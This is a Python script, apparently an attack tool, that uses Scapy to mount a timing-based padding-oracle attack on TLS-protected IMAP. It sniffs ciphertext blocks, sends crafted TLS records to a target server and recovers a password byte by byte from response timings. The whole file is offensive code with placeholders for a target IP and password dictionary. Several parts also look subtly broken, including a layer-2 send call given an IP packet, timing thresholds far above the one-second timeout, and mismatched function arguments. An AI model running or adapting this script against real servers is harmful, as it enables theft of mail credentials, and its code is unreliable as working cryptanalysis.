from scapy.all import *
from scapy.layers.tls import *
import time
import random
from collections import Counter
import scipy.stats as stats  # For statistical testing

# Configuration
TARGET_IP = "192.168.1.100"  # Replace with the target IMAP server IP
TARGET_PORT = 143            # IMAP port
PASSWORD_BLOCK = b"password" # Replace with the password block to decrypt
BLOCK_SIZE = 8               # Block size of the cipher (e.g., 8 for DES)
NUM_SAMPLES = 10             # Number of timing samples per byte test
THRESHOLD = 32.93            # Threshold for ignoring outlier timing samples
ACCEPTANCE_THRESHOLD = 0.9   # Threshold for accepting a byte based on statistical test

# Dictionary for password guessing (optional)
DICTIONARY = [
    # Add your password dictionary here
]
DICTIONARY_PROBABILITIES = [
    # Add corresponding probabilities for each password
]

# Oracle function to send a packet and get timing information
def oracle(pkt):
    start_time = time.time()
    srp1(pkt, iface="eth0", timeout=1, verbose=0)  # Send packet and wait for response
    end_time = time.time()
    return end_time - start_time

# Function to check if the padding is correct using timing analysis
def check_padding(y, u, y_prime):
    i = len(u)
    L = random.randbytes(BLOCK_SIZE - i)
    R = (i - 1).to_bytes(1, 'big') * i
    r = bytes([x ^ y for x, y in zip(L + (R + u), y_prime)])  # XOR operation on bytes
    f = random.randbytes(214 + 2048)  # Fill with random data
    pkt = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT) / TLS(version=0x301, cipher_suites=[0x0000]) / f / r / y
    times = []
    for _ in range(NUM_SAMPLES):
        t = oracle(pkt)
        if t < THRESHOLD:  # Ignore outlier timings
            times.append(t)
    return times

# Function to decrypt a single byte based on timing information
def decrypt_byte(s, y_prime):
    candidates = range(256)
    if DICTIONARY:  # If using dictionary
        candidates = [ord(c) for c in DICTIONARY]
        candidates.sort(key=lambda c: -DICTIONARY_PROBABILITIES[DICTIONARY.index(chr(c))])
    for c in candidates:
        times = check_padding(s + bytes([c]), s, y_prime)
        if times:  # If we have enough valid timings
            try:
                t_statistic, p_value = stats.ttest_1samp(times, 21.57)  # Adjust 21.57 based on your timing analysis
                acceptance_probability = 1 - p_value
            except:  # Handle cases where the t-test fails (e.g., insufficient samples)
                acceptance_probability = 0
            if acceptance_probability > ACCEPTANCE_THRESHOLD:
                return c
    return None

# Function to decrypt a block using byte-by-byte decryption
def decrypt_block(y, y_prime):
    decrypted = b""
    for _ in range(BLOCK_SIZE):
        c = decrypt_byte(decrypted, y_prime)
        if c is not None:
            decrypted = bytes([c]) + decrypted
        else:
            return None
    return decrypted

# Function to capture TLS packets and extract relevant blocks
def get_tls_blocks():
    captured_packets = sniff(filter=f"tcp and port {TARGET_PORT}", iface="eth0", count=1, timeout=10)  # Capture one packet on port 143
    for packet in captured_packets:
        if packet.haslayer(TLS) and packet.haslayer(Raw):  # Look for TLS packets with raw payload
            # Extract the relevant ciphertext blocks based on your knowledge of the protocol
            y = packet[Raw].load[-BLOCK_SIZE:]  # Get the last BLOCK_SIZE bytes of the payload
            y_prime = packet[Raw].load[-2*BLOCK_SIZE:-BLOCK_SIZE]  # Get the previous BLOCK_SIZE bytes
            return y, y_prime
    return None, None  # Return None if no relevant blocks are found

# Main attack loop
def attack():
    while True:
        y, y_prime = get_tls_blocks()
        if y is not None and y_prime is not None:  # Check if we have valid blocks
            decrypted = decrypt_block(y, y_prime)
            if decrypted:
                print("Decrypted password:", decrypted.decode(errors='ignore'))
                break
        else:
            print("No valid TLS blocks found. Waiting for another session.")

if __name__ == "__main__":
    attack()
